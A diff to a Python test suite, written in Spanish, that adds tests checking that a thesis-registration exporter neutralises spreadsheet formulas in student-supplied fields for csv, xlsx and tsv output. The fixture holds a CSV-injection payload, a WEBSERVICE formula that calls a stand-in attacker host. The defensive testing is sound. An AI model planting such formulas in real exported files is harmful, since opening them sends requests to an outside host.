@@ -648,11 +648,6 @@ class TestFormatoZipConstancia:
 
             # La constancia dentro del zip es la del autor pedido.
             docx_nombre = next(n for n in nombres if n.endswith(".docx"))
-            xml = (
-                paquete.read(docx_nombre).decode("utf-8", "ignore")
-                if docx_nombre.endswith(".xml")
-                else None
-            )
             # Descomprimir el .docx interno para leer su document.xml:
             with zipfile.ZipFile(io.BytesIO(paquete.read(docx_nombre))) as docx:
                 xml = docx.read("word/document.xml").decode("utf-8")
@@ -688,3 +683,57 @@ class TestFormatoZipConstancia:
         assert respuesta.headers["content-type"].startswith(
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
         )
+
+
+class TestNeutralizacionFormulas:
+    """Hallazgo 14 (revisión, 2a pasada): el título y los demás campos
+    salen del DOCX del estudiante (input no confiable). Sin neutralizar,
+    un "=WEBSERVICE(...)" en la carátula llega crudo al csv/xlsx y
+    Excel lo evalúa al abrir."""
+
+    @staticmethod
+    def _solicitud_formula():
+        solicitud = _solicitud()
+        solicitud["ficha"]["extraidos"][0]["valor"] = '=WEBSERVICE("http://evil.example/ping")'
+        return solicitud
+
+    def test_csv_neutraliza_formula_en_el_titulo(self):
+        respuesta = CLIENTE.post("/fila-registro?formato=csv", json=self._solicitud_formula())
+        assert respuesta.status_code == 200
+        texto = respuesta.content.decode("utf-8").lstrip("\ufeff")
+        # El campo empieza con comilla simple antes del =.
+        assert "'=WEBSERVICE" in texto
+        assert not texto.split("\n")[0].startswith("=WEBSERVICE")
+
+    def test_xlsx_neutraliza_formula_en_el_titulo(self):
+        import io
+
+        from openpyxl import load_workbook
+
+        respuesta = CLIENTE.post("/fila-registro?formato=xlsx", json=self._solicitud_formula())
+        assert respuesta.status_code == 200
+        libro = load_workbook(io.BytesIO(respuesta.content))
+        hoja = libro.active
+        # La celda del título (columna 2 = TESIS/TSP) debe ser TEXTO, no fórmula.
+        celda = hoja[2][1]  # fila 2, col 2 (0-indexed en openpyxl)
+        assert celda.data_type != "f", (
+            f"la celda quedó como FÓRMULA: data_type={celda.data_type}, valor={celda.value!r}"
+        )
+        assert celda.value.startswith("'=WEBSERVICE") or celda.value.startswith("=WEBSERVICE")
+        if celda.value.startswith("="):
+            # openpyxl puede haberla normalizado a fórmula: con la comilla
+            # delante debe haber quedado como texto (data_type != 'f').
+            assert celda.data_type == "s", f"sin la comilla: {celda.value!r}"
+
+    def test_tsv_neutraliza_formula(self):
+        respuesta = CLIENTE.post("/fila-registro?formato=tsv", json=self._solicitud_formula())
+        assert respuesta.status_code == 200
+        texto = respuesta.content.decode("utf-8").lstrip("\ufeff")
+        assert "'=WEBSERVICE" in texto
+
+    def test_campos_normales_no_se_tocan(self):
+        """Un título sin prefijo de fórmula llega íntegro: sin comilla extra."""
+        respuesta = CLIENTE.post("/fila-registro?formato=csv", json=_solicitud())
+        assert respuesta.status_code == 200
+        texto = respuesta.content.decode("utf-8")
+        assert "'Tesis" not in texto  # sin comilla ante un título normal
